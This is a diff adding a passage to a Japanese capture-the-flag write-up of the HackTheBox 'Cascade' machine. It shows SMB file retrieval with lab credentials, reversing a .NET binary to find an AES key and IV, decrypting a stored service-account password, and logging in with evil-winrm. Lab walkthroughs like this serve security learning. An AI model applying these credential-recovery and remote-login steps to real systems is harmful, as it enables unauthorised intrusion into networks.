@@ -254,3 +254,64 @@ CREATE TABLE IF NOT EXISTS "Ldap" (
 sqlite> select * from Ldap;
 1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
 ```
+
+このarksvcのパスワードはただのbase64ではなく、単にデコードしただけでは文字化けしてしまう。
+
+先のSMBシェアフォルダAudit$にあったexeファイルとdllファイルをダウンロードする：
+
+```
+┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182/SMB-Audit]
+└─$ smbclient -U s.smith%sT333ve2 '//10.10.10.182/Audit$'  
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Thu Jan 30 03:01:26 2020
+  ..                                  D        0  Thu Jan 30 03:01:26 2020
+  CascAudit.exe                      An    13312  Wed Jan 29 06:46:51 2020
+  CascCrypto.dll                     An    12288  Thu Jan 30 03:00:20 2020
+  DB 
+...
+smb: \> get CascAudit.exe
+smb: \> get CascCrypto.dll
+```
+
+ファイル名からして、なにかパスワードをデクリプトするための情報がありそうなので、dnSpyで解析する（ghidraでなく、exeやdllの解析はdnSpyが最良）。
+
+ざっとみたところ、base64に加えてAESによる暗号化も行っていると判明。
+
+以下の画像のように、KeyとIVを発見：
+
+![found_key](https://user-images.githubusercontent.com/85237728/197941730-b8426420-52d6-4184-81e8-49ea6d8b3e98.png)
+
+![found-IV](https://user-images.githubusercontent.com/85237728/197941740-ad6957da-434a-462d-85ac-ae1290a40ad3.png)
+
+あとはCyberChefにぶち込んで復号する：
+
+![decrypt](https://user-images.githubusercontent.com/85237728/197941745-0f8d786d-2748-4a06-bea8-1cf6dac73ffb.png)
+
+arksvcはAD Recycle Binグループに属している：
+
+```
+┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
+└─$ evil-winrm -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd
+
+*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami
+cascade\arksvc
+
+*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ===============================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\AD Recycle Bin
+...
+```
